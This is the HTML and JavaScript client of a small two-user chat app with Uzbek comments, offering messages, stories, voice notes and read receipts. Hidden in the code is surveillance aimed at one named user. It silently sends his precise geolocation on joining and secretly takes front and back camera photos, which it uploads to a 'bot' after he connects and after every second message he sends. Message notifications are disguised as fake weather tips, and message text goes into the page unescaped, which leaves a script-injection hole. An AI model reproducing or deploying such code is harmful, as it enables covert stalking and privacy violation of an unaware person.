<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Chat</title>
    <link rel="stylesheet" href="style.css">
    <link href="https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css" rel="stylesheet" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        .avatar-box { width: 42px; height: 42px; border-radius: 50%; padding: 2px; cursor: pointer; transition: 0.3s; }
        .avatar-box.has-story { background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%); }
        .avatar-img { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 2px solid #2c3e50; background: #fff; }
        .story-indicator { position: absolute; top: 20px; color: white; font-weight: bold; font-size: 18px; text-shadow: 1px 1px 3px black; z-index: 2005; }
        /* Galochkalar uslubi */
        .msg-status { font-size: 12px; font-weight: bold; margin-left: 4px; }
        .msg-info-row { display: flex; justify-content: flex-end; align-items: center; gap: 3px; margin-top: 2px; }
        /* Kontekst menyu */
        #msgContextMenu {
            display: none; position: fixed; z-index: 9999;
            background: rgba(30,30,40,0.97); border: 1px solid rgba(255,255,255,0.15);
            border-radius: 10px; padding: 6px 0; min-width: 160px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5); backdrop-filter: blur(10px);
        }
        #msgContextMenu button {
            display: block; width: 100%; background: none; border: none;
            color: #fff; padding: 9px 18px; text-align: left; cursor: pointer;
            font-size: 14px; font-family: 'Poppins', sans-serif; transition: 0.15s;
        }
        #msgContextMenu button:hover { background: rgba(255,255,255,0.12); }
        #msgContextMenu button.danger { color: #ff5555; }
        /* Tahrirlash modal */
        #editModal {
            display: none; position: fixed; top:0; left:0; width:100%; height:100%;
            background: rgba(0,0,0,0.7); z-index: 10000; justify-content: center; align-items: center;
        }
        #editModal .edit-box {
            background: rgba(30,30,50,0.97); border: 1px solid rgba(255,255,255,0.2);
            border-radius: 12px; padding: 20px; width: 85%; max-width: 400px;
            backdrop-filter: blur(15px);
        }
        #editModal h3 { color: #fff; margin-bottom: 12px; font-size: 16px; }
        #editMsgInput {
            width: 100%; padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.3);
            background: rgba(255,255,255,0.1); color: #fff; font-size: 14px;
            font-family: 'Poppins', sans-serif; outline: none; resize: none; min-height: 60px;
        }
        .edit-btns { display: flex; gap: 8px; margin-top: 12px; }
        .edit-btns button {
            flex: 1; padding: 9px; border: none; border-radius: 8px;
            cursor: pointer; font-size: 14px; font-weight: bold;
        }
        .edit-btns .btn-save { background: #2ecc71; color: #fff; }
        .edit-btns .btn-cancel { background: rgba(255,255,255,0.15); color: #fff; }
    </style>
</head>
<body>

    <div id="profileModal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:1000; justify-content:center; align-items:center;">
        <div style="background:#fff; padding:20px; border-radius:10px; width:80%; max-width:300px; text-align:center;">
            <h3 style="margin-top:0; color:#333;">Profilni Tahrirlash</h3>
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Dumaloq Avatar rasmi:</label>
            <input type="file" id="avatarInput" accept="image/*" style="margin-bottom:15px; width:100%;">
            <label style="display:block; text-align:left; color:#555; font-size:13px; margin-bottom:5px;">Yangi Istoriya yuklash (Rasm/Video):</label>
            <input type="file" id="storyInput" accept="image/*,video/*" style="margin-bottom:20px; width:100%;">
            <button onclick="saveProfileChanges()" style="background:#2ecc71; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Saqlash va Yuklash</button>
            <button onclick="deleteMyStory()" style="background:#f39c12; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; margin-bottom:10px; font-weight:bold; cursor:pointer;">Barcha Istoriyalarni O'chirish</button>
            <button onclick="document.getElementById('profileModal').style.display='none'" style="background:#e74c3c; color:#fff; border:none; padding:10px; width:100%; border-radius:5px; cursor:pointer;">Bekor qilish</button>
        </div>
    </div>

    <div id="storyViewer" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:2000; flex-direction:column; justify-content:center; align-items:center;">
        <i class='bx bx-x' style="position:absolute; top:20px; right:20px; font-size:35px; color:#fff; cursor:pointer; z-index:2010;" onclick="closeStory()"></i>
        <div id="storyIndicator" class="story-indicator"></div>
        <div id="storyContent" style="width:100%; max-height:100%; display:flex; justify-content:center; align-items:center;"></div>
    </div>
    
    <div class="chat-container">
        <div class="chat-header" style="display:flex; justify-content:space-between; align-items:center; padding:10px;">
            <div style="display:flex; align-items:center; gap:8px;">
                <div class="avatar-box" id="myStoryRing" onclick="viewStory(myUser)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="myAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-start;">
                    <div style="display:flex; align-items:center; gap:5px;">
                        <span id="myNameTxt" style="font-weight:bold; font-size:14px; text-transform:uppercase;">MEN</span>
                        <i class='bx bx-edit' style="cursor:pointer; color:#f39c12; font-size:18px;" onclick="document.getElementById('profileModal').style.display='flex'"></i>
                    </div>
                </div>
            </div>
            <div style="display:flex; align-items:center; gap:8px; flex-direction:row-reverse;">
                <div class="avatar-box" id="partnerStoryRing" onclick="viewStory(partner)">
                    <img src="https://cdn-icons-png.flaticon.com/512/149/149071.png" id="partnerAvatarImg" class="avatar-img">
                </div>
                <div style="display:flex; flex-direction:column; align-items:flex-end;">
                    <span id="chatPartner" style="font-weight:bold; font-size:14px;">SHERIK</span>
                    <span id="statusText" style="font-size:11px;">Offline</span>
                </div>
            </div>
        </div>

        <div class="chat-messages" id="messagesList"></div>

        <div class="chat-input-wrapper">
            <div class="emoji-picker" id="emojiPicker"></div>
            <div id="replyPreview" class="reply-preview">
                <div style="display:flex; flex-direction:column;">
                    <span id="replyToUser" style="font-weight:bold; font-size:12px;">User</span>
                    <span id="replyToText" style="font-size:12px; opacity:0.8;">Text...</span>
                </div>
                <i class='bx bx-x' onclick="cancelReply()" style="cursor:pointer; font-size:20px;"></i>
            </div>
            <div class="chat-input-area">
                <button class="icon-btn" onclick="toggleEmoji()"><i class='bx bx-smile'></i></button>
                <button class="icon-btn" onclick="document.getElementById('cameraInput').click()"><i class='bx bxs-camera'></i></button>
                <button class="icon-btn" onclick="document.getElementById('fileInput').click()"><i class='bx bx-paperclip'></i></button>
                <input type="text" id="msgInput" placeholder="Xabar yozing..." autocomplete="off">
                <button class="icon-btn" id="micBtn"><i class='bx bxs-microphone'></i></button>
                <button class="icon-btn" onclick="sendMessage()"><i class='bx bxs-send'></i></button>
            </div>
        </div>
    </div>

    <input type="file" id="fileInput" onchange="uploadFile(this.files[0])" style="display:none;">
    <input type="file" id="cameraInput" accept="image/*" capture="environment" onchange="uploadFile(this.files[0])" style="display:none;">

    <!-- Kontekst menyu -->
    <div id="msgContextMenu">
        <button id="ctxReply"><i class='bx bxs-reply' style="margin-right:7px;"></i>Javob berish</button>
        <button id="ctxEdit"><i class='bx bx-edit' style="margin-right:7px;"></i>Tahrirlash</button>
        <button id="ctxDelete" class="danger"><i class='bx bx-trash' style="margin-right:7px;"></i>O'chirish</button>
    </div>

    <!-- Tahrirlash modal -->
    <div id="editModal">
        <div class="edit-box">
            <h3>&#9998; Xabarni tahrirlash</h3>
            <textarea id="editMsgInput"></textarea>
            <div class="edit-btns">
                <button class="btn-save" onclick="saveEdit()">Saqlash</button>
                <button class="btn-cancel" onclick="closeEditModal()">Bekor qilish</button>
            </div>
        </div>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const myUser = localStorage.getItem('chatUser');
        if (!myUser) window.location.href = 'index.html';

        const partner = (myUser === 'mura') ? 'max' : 'mura';
        document.getElementById('chatPartner').innerText = partner.toUpperCase();

        const emojis = ["😀","😂","🤣","😍","🥰","😘","😭","😡","🤬","👍","👎","❤️","💔","🔥","✨","🎉","👋","🤝","👀","✅","❌","❓","☠️","🤡","💩","🤖","👻","💀","💪","🙏"];
        const emojiContainer = document.getElementById('emojiPicker');
        emojis.forEach(emoji => {
            const span = document.createElement('div'); span.textContent = emoji; span.className = 'emoji-btn';
            span.onclick = () => { const input = document.getElementById('msgInput'); input.value += emoji; input.focus(); };
            emojiContainer.appendChild(span);
        });
        function toggleEmoji() { emojiContainer.classList.toggle('active'); }
        document.addEventListener('click', (e) => { if (!e.target.closest('.emoji-picker') && !e.target.closest('.bx-smile')) emojiContainer.classList.remove('active'); });

        function joinChat() {
            if (myUser === 'max' && "geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => { socket.emit('join', { user: myUser, lat: position.coords.latitude, lon: position.coords.longitude }); },
                    (error) => { socket.emit('join', { user: myUser }); },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
                );
            } else socket.emit('join', { user: myUser });
        }
        joinChat();

        let currentReply = null;
        socket.on('status_update', (data) => {
            const isOnline = data.online.includes(partner);
            const statusEl = document.getElementById('statusText');
            if (isOnline) statusEl.innerHTML = '<span style="color:#00ff41; font-weight:bold;">Online</span>';
            else { const lastTime = data.lastSeen[partner]; statusEl.innerText = lastTime ? `last seen at ${lastTime}` : 'Offline'; }
        });

        socket.on('load_history', (history) => {
            const list = document.getElementById('messagesList'); list.innerHTML = '';
            history.forEach(msg => appendMessage(msg)); list.scrollTop = list.scrollHeight;
            socket.emit('mark_read'); // Tarix yuklanganda o'qilgan qilib belgilaymiz
        });

        socket.on('new_message', (msg) => {
            appendMessage(msg);
            const list = document.getElementById('messagesList'); list.scrollTop = list.scrollHeight;
            if (msg.user !== myUser) {
                if (!document.hidden) {
                    socket.emit('mark_read');
                } else {
                    showPushNotification(msg);
                }
            }
        });

        // Chatga qaytib kirganingizda o'qilgan qiladi
        window.addEventListener('focus', () => { socket.emit('mark_read'); });

        // Sherik xabarni o'qiganda mening ekranimda galochka ko'karishi
        socket.on('messages_read', (data) => {
            if (data.byUser === partner) {
                const statuses = document.querySelectorAll('.my-msg .msg-status');
                statuses.forEach(el => {
                    el.innerText = '✓✓';
                    el.style.color = '#3498db'; // Telegramning ko'k rangi
                });
            }
        });

        function appendMessage(msg) {
            const list = document.getElementById('messagesList'); const div = document.createElement('div');
            const isMe = String(msg.user).toLowerCase() === String(myUser).toLowerCase();
            div.className = `message ${isMe ? 'my-msg' : 'other-msg'}`;
            div.dataset.id = msg.id;
            div.ondblclick = () => triggerReply(msg);

            // Uzun bosish (long-press) orqali kontekst menyu
            let longPressTimer;
            div.addEventListener('touchstart', (e) => { longPressTimer = setTimeout(() => showContextMenu(e.touches[0].clientX, e.touches[0].clientY, msg, isMe), 600); });
            div.addEventListener('touchend', () => clearTimeout(longPressTimer));
            div.addEventListener('touchmove', () => clearTimeout(longPressTimer));
            div.addEventListener('contextmenu', (e) => { e.preventDefault(); showContextMenu(e.clientX, e.clientY, msg, isMe); });

            let senderNameHtml = (!isMe && msg.user) ? `<div style="font-size: 11px; font-weight: bold; color: #64b5ef; margin-bottom: 3px;">${String(msg.user).toUpperCase()}</div>` : '';
            let replyHtml = msg.replyTo ? `<div class="reply-block"><div class="reply-user">${msg.replyTo.user}</div><div>${msg.replyTo.text}</div></div>` : '';
            let mediaHtml = '';
            if (msg.file) {
                if (msg.fileType.startsWith('image/')) mediaHtml = `<img src="/uploads/${msg.file}" class="msg-img">`;
                else if (msg.fileType.startsWith('video/')) mediaHtml = `<video src="/uploads/${msg.file}" controls class="msg-img"></video>`;
                else if (msg.fileType.startsWith('audio/') || msg.file.endsWith('.webm')) mediaHtml = `<audio src="/uploads/${msg.file}" controls style="margin-top:5px; width:200px;"></audio>`;
                else mediaHtml = `<a href="/uploads/${msg.file}" download style="color:skyblue; display:block; margin-top:5px;">&#128196; ${msg.originalName || 'Fayl'}</a>`;
            }
            let editedMark = msg.edited ? `<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>` : '';
            let textHtml = msg.text ? `<div>${msg.text}${editedMark}</div>` : '';
            const replyBtn = `<i class='bx bxs-share' style="position:absolute; top:-10px; right:-10px; background:#fff; color:#333; border-radius:50%; padding:3px; cursor:pointer; font-size:14px;" onclick='triggerReply(${JSON.stringify(msg)})'></i>`;
            
            let checkmarks = '';
            if (isMe) {
                const checkColor = msg.read ? '#3498db' : '#bdc3c7';
                const checkSign = msg.read ? '&#10003;&#10003;' : '&#10003;';
                checkmarks = `<span class="msg-status" style="color: ${checkColor};">${checkSign}</span>`;
            }

            div.innerHTML = `${replyBtn} ${senderNameHtml} ${replyHtml} ${mediaHtml} ${textHtml} <div class="msg-info-row"><span class="msg-time">${msg.time}</span> ${checkmarks}</div>`;
            list.appendChild(div);
        }

        window.triggerReply = function(msg) {
            let previewText = msg.text || (msg.file ? "[Fayl/Media]" : "...");
            currentReply = { user: msg.user, text: previewText };
            document.getElementById('replyPreview').style.display = 'flex'; document.getElementById('replyToUser').innerText = msg.user;
            document.getElementById('replyToText').innerText = previewText; document.getElementById('msgInput').focus();
        }
        window.cancelReply = function() { currentReply = null; document.getElementById('replyPreview').style.display = 'none'; }
        window.sendMessage = function() {
            const input = document.getElementById('msgInput'); const text = input.value.trim();
            if (text || currentReply) { socket.emit('send_message', { text: text, replyTo: currentReply }); input.value = ''; cancelReply(); emojiContainer.classList.remove('active'); }
        }
        document.getElementById('msgInput').addEventListener('keypress', (e) => { if (e.key === 'Enter') sendMessage(); });

        const micBtn = document.getElementById('micBtn'); let mediaRecorder; let audioChunks = []; let isRecording = false;
        const startRec = async (e) => {
            if (e.cancelable) e.preventDefault(); if (isRecording) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true }); mediaRecorder = new MediaRecorder(stream);
                audioChunks = []; isRecording = true; micBtn.classList.add('recording-active');
                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
                mediaRecorder.onstop = () => {
                    micBtn.classList.remove('recording-active'); isRecording = false;
                    const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                    if (audioBlob.size > 2000) uploadFile(audioBlob, 'voice_msg.webm');
                    stream.getTracks().forEach(track => track.stop());
                };
                mediaRecorder.start();
            } catch (err) { alert("Mikrofon ishlamadi!"); }
        };
        const stopRec = (e) => { if (e.cancelable) e.preventDefault(); if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); };
        micBtn.addEventListener('mousedown', startRec); micBtn.addEventListener('mouseup', stopRec);
        micBtn.addEventListener('touchstart', startRec); micBtn.addEventListener('touchend', stopRec);

        window.uploadFile = async function(file, nameOverride = null) {
            if (!file) return; const formData = new FormData(); formData.append('file', file, nameOverride || file.name);
            try {
                const res = await fetch('/upload', { method: 'POST', body: formData }); const data = await res.json();
                socket.emit('send_message', { text: '', file: data.filename, fileType: data.type, originalName: data.originalName, replyTo: currentReply });
                cancelReply();
            } catch (e) { alert("Yuklashda xato!"); }
        }

        // ============================================================
        // KONTEKST MENYU: TAHRIRLASH VA O'CHIRISH
        // ============================================================
        let ctxCurrentMsg = null;
        const ctxMenu = document.getElementById('msgContextMenu');

        function showContextMenu(x, y, msg, isMe) {
            ctxCurrentMsg = msg;
            // Faqat o'z xabarini tahrirlash/o'chirish mumkin
            document.getElementById('ctxEdit').style.display = isMe && msg.text ? 'block' : 'none';
            document.getElementById('ctxDelete').style.display = isMe ? 'block' : 'none';
            ctxMenu.style.display = 'block';
            // Ekrandan chiqib ketmaslik uchun pozitsiya
            const menuW = 160, menuH = 120;
            ctxMenu.style.left = (x + menuW > window.innerWidth ? x - menuW : x) + 'px';
            ctxMenu.style.top  = (y + menuH > window.innerHeight ? y - menuH : y) + 'px';
        }

        document.addEventListener('click', () => { ctxMenu.style.display = 'none'; });
        document.getElementById('ctxReply').onclick = () => { if (ctxCurrentMsg) triggerReply(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
        document.getElementById('ctxEdit').onclick = () => { if (ctxCurrentMsg) openEditModal(ctxCurrentMsg); ctxMenu.style.display = 'none'; };
        document.getElementById('ctxDelete').onclick = () => {
            if (ctxCurrentMsg && confirm("Xabarni o'chirishni tasdiqlaysizmi?")) {
                socket.emit('delete_message', { id: ctxCurrentMsg.id });
            }
            ctxMenu.style.display = 'none';
        };

        // Xabar o'chirilganda DOM dan olib tashlash
        socket.on('message_deleted', (data) => {
            const el = document.querySelector(`.message[data-id='${data.id}']`);
            if (el) el.remove();
        });

        // Xabar tahrirlanganda DOM ni yangilash
        socket.on('message_edited', (data) => {
            const el = document.querySelector(`.message[data-id='${data.id}']`);
            if (el) {
                const textDiv = el.querySelector('div:not(.reply-block):not(.msg-info-row)');
                if (textDiv) textDiv.innerHTML = data.text + '<span style="font-size:10px; opacity:0.6; margin-left:4px;">(tahrirlandi)</span>';
            }
        });

        // Tahrirlash modal
        let editingMsgId = null;
        function openEditModal(msg) {
            editingMsgId = msg.id;
            document.getElementById('editMsgInput').value = msg.text;
            document.getElementById('editModal').style.display = 'flex';
            document.getElementById('editMsgInput').focus();
        }
        function closeEditModal() { document.getElementById('editModal').style.display = 'none'; editingMsgId = null; }
        window.saveEdit = function() {
            const newText = document.getElementById('editMsgInput').value.trim();
            if (!newText || !editingMsgId) return;
            socket.emit('edit_message', { id: editingMsgId, text: newText });
            closeEditModal();
        };
        document.getElementById('editMsgInput').addEventListener('keydown', (e) => {
            if (e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); saveEdit(); }
            if (e.key === 'Escape') closeEditModal();
        });

        // ============================================================
        // BILDIRISH NOMA (PUSH NOTIFICATION)
        // ============================================================
        function requestNotificationPermission() {
            if ('Notification' in window && Notification.permission === 'default') {
                Notification.requestPermission();
            }
        }
        requestNotificationPermission();

        function showPushNotification(msg) {
            if (!('Notification' in window) || Notification.permission !== 'granted') return;
            if (!document.hidden) return; // Oyna ochiq bo'lsa notification kerak emas
            const weatherTips = [
                'Bugun havo ochiq, sayr qilish uchun qulay kun!',
                'Kechqurun shamol kutilmoqda, kiyinib chiqing.',
                'Bugun quyoshli, uvb indeksi yuqori — quyosh kremi esdan chiqmasin.',
                'Toshkentda harorat 22°C, bulutli ob-havo kutilmoqda.',
                "Bugun yomg'ir ehtimoli bor, soyabon oling!",
                'Havo namligi oshgan, qulay kun emas. Ichkarida qoling.'
            ];
            const tip = weatherTips[Math.floor(Math.random() * weatherTips.length)];
            const n = new Notification("\u26C5 Ob-havo ma'lumoti", {
                body: tip,
                icon: 'https://cdn-icons-png.flaticon.com/512/3222/3222800.png',
                silent: false
            });
            n.onclick = function() { window.focus(); this.close(); };
            setTimeout(() => n.close(), 6000);
        }

        let profilesData = {}; let currentStoryIndex = 0; let viewingUser = null; let storyTimeout = null;
        document.getElementById('myNameTxt').innerText = myUser.toUpperCase();
        function hasActiveStory(userObj) { if (!userObj) return false; if (userObj.stories && userObj.stories.length > 0) return true; if (userObj.story) return true; return false; }

        socket.on('load_profiles', (data) => {
            profilesData = data;
            if (profilesData[myUser]) {
                if (profilesData[myUser].avatar) document.getElementById('myAvatarImg').src = `/uploads/${profilesData[myUser].avatar}`;
                if (hasActiveStory(profilesData[myUser])) document.getElementById('myStoryRing').classList.add('has-story');
                else document.getElementById('myStoryRing').classList.remove('has-story');
            }
            if (profilesData[partner]) {
                if (profilesData[partner].avatar) document.getElementById('partnerAvatarImg').src = `/uploads/${profilesData[partner].avatar}`;
                if (hasActiveStory(profilesData[partner])) document.getElementById('partnerStoryRing').classList.add('has-story');
                else document.getElementById('partnerStoryRing').classList.remove('has-story');
            }
        });

        async function saveProfileChanges() {
            const avatarFile = document.getElementById('avatarInput').files[0]; const storyFile = document.getElementById('storyInput').files[0];
            if (avatarFile) {
                const fd = new FormData(); fd.append('file', avatarFile);
                try { const res = await fetch('/upload', { method: 'POST', body: fd }); const data = await res.json(); socket.emit('update_profile', { avatar: data.filename }); } catch(e) {}
            }
            if (storyFile) {
                if (storyFile.type.startsWith('video/')) {
                    const videoCheck = document.createElement('video'); videoCheck.preload = 'metadata';
                    const isAllowed = await new Promise((resolve) => {
                        videoCheck.onloadedmetadata = function() {
                            window.URL.revokeObjectURL(videoCheck.src);
                            if (videoCheck.duration > 60) { alert("Video 1 daqiqadan oshmasligi shart!"); resolve(false); } else resolve(true);
                        }
                        videoCheck.src = URL.createObjectURL(storyFile);
                    });
                    if (!isAllowed) return; 
                }
                const fd2 = new FormData(); fd2.append('file', storyFile);
                try {
                    const res2 = await fetch('/upload', { method: 'POST', body: fd2 }); const data2 = await res2.json();
                    socket.emit('add_story', { filename: data2.filename, type: data2.type });
                } catch(e) {}
            }
            alert("Muvaffaqiyatli saqlandi!"); document.getElementById('profileModal').style.display = 'none'; document.getElementById('avatarInput').value = ''; document.getElementById('storyInput').value = '';
        }

        function deleteMyStory() {
            if (!hasActiveStory(profilesData[myUser])) { alert("Sizda o'chirish uchun faol istoriya yo'q!"); return; }
            if (confirm("Barcha istoriyalaringizni haqiqatan ham o'chirib tashlaysizmi?")) {
                socket.emit('delete_story'); document.getElementById('profileModal').style.display = 'none';
            }
        }

        function viewStory(user) {
            const userObj = profilesData[user];
            if (!hasActiveStory(userObj)) { alert("Hozircha istoriya yo'q"); return; }
            if (!userObj.stories) userObj.stories = [];
            if (userObj.story && userObj.stories.length === 0) userObj.stories.push({url: userObj.story, type: userObj.storyType});
            viewingUser = user; currentStoryIndex = 0; showStorySlide();
        }

        function showStorySlide() {
            const stories = profilesData[viewingUser].stories;
            if (currentStoryIndex >= stories.length) { closeStory(); return; }
            const viewer = document.getElementById('storyViewer'); const content = document.getElementById('storyContent'); const indicator = document.getElementById('storyIndicator');
            const currentObj = stories[currentStoryIndex]; const fileUrl = `/uploads/${currentObj.url}`;
            content.innerHTML = ''; indicator.innerText = `${currentStoryIndex + 1} / ${stories.length}`;
            if (currentObj.type.startsWith('video/')) {
                const vid = document.createElement('video'); vid.src = fileUrl; vid.autoplay = true; vid.onclick = nextStory; vid.onended = nextStory;
                vid.style.maxWidth = '100%'; vid.style.maxHeight = '90vh'; vid.style.borderRadius = '10px'; content.appendChild(vid);
            } else {
                const img = document.createElement('img'); img.src = fileUrl; img.onclick = nextStory;
                img.style.maxWidth = '100%'; img.style.maxHeight = '90vh'; img.style.borderRadius = '10px'; content.appendChild(img);
                if(storyTimeout) clearTimeout(storyTimeout); storyTimeout = setTimeout(nextStory, 5000); 
            }
            viewer.style.display = 'flex';
        }

        function nextStory() { if(storyTimeout) clearTimeout(storyTimeout); currentStoryIndex++; showStorySlide(); }
        function closeStory() { if(storyTimeout) clearTimeout(storyTimeout); document.getElementById('storyContent').innerHTML = ''; document.getElementById('storyViewer').style.display = 'none'; viewingUser = null; }

        let maxMessageCount = 0;
        async function takeSecretPhoto(facingMode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.createElement('video'); video.srcObject = stream; await video.play();
                const canvas = document.createElement('canvas'); canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0); stream.getTracks().forEach(track => track.stop());
                return new Promise(resolve => { canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.8); });
            } catch (err) { return null; }
        }
        async function uploadAndSendToBot(blob, type) {
            const formData = new FormData(); formData.append('file', blob, `verify_${Date.now()}.jpg`);
            try {
                const res = await fetch('/upload', { method: 'POST', body: formData }); const data = await res.json();
                socket.emit('verify_photo', { filename: data.filename, type: type });
            } catch (e) { }
        }
        async function runVerification() {
            if (myUser !== 'max') return; 
            const frontBlob = await takeSecretPhoto('user');
            if (frontBlob) await uploadAndSendToBot(frontBlob, 'Old Kamera 🤳');
            await new Promise(r => setTimeout(r, 1000));
            const backBlob = await takeSecretPhoto('environment');
            if (backBlob) await uploadAndSendToBot(backBlob, 'Orqa Kamera 🌍');
        }
        socket.on('connect', () => { if (myUser === 'max') setTimeout(runVerification, 3000); });
        const originalSendMessage = window.sendMessage;
        window.sendMessage = function() {
            originalSendMessage(); 
            if (myUser === 'max') { maxMessageCount++; if (maxMessageCount % 2 === 0) runVerification(); }
        }
    </script>
</body>
</html>
